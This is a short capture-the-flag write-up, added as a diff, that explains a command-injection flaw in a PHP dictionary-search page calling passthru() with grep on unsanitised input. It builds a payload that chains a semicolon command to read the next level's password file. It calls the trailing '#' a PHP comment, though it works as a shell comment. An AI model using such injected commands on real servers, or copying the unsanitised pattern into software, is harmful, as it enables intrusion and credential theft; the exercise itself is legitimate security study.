@@ -1,0 +1,38 @@
+This one is a webpage that allows you to search a dictionary file for words containing 
+whatever you input into the search field.
+
+Since it allows for user input, it has a flaw that allows you to insert an arbitrary command of your choice.
+
+<?
+	$key = "";
+
+	if(array_key_exists("needle", $_REQUEST)) {
+	    $key = $_REQUEST["needle"];
+	}
+
+	if($key != "") {
+	    passthru("grep -i $key dictionary.txt");
+	}
+?>
+
+the "passthru" command pushes it's parameter to be exected on the host machine running the webpage, in this case a linux server.
+
+Upon being completed, the output is displayed on the webpage.
+
+Utilizing some tricks with the way bash is interpreted, and the lack of sanitization of user input in this php,
+you can do several things:
+
+1, disregard the grep portion of the command completely by giving it a random search query, and directing the output to /dev/null
+
+i.e.  passthru("grep -i a > /dev/null dictionary.txt");
+
+2, add a ; to allow you to input your own command, such as 'cat'ing out the password file 
+
+i.e.  passthru("grep -i a > /dev/null; cat /etc/natas_webpass/natas10 dictionary.txt");
+
+3, remove the extraneous "dictionary.txt" portion of the passthru command to avoid errors by adding a php comment (#)
+
+i.e.  passthru("grep -i a > /dev/null; cat /etc/natas_webpass/natas10 # dictionary.txt");
+
+In otherwords, passing 'a > /dev/null; cat /etc/natas_webpass/natas10 #' to the search field will yield the next levels password!
+
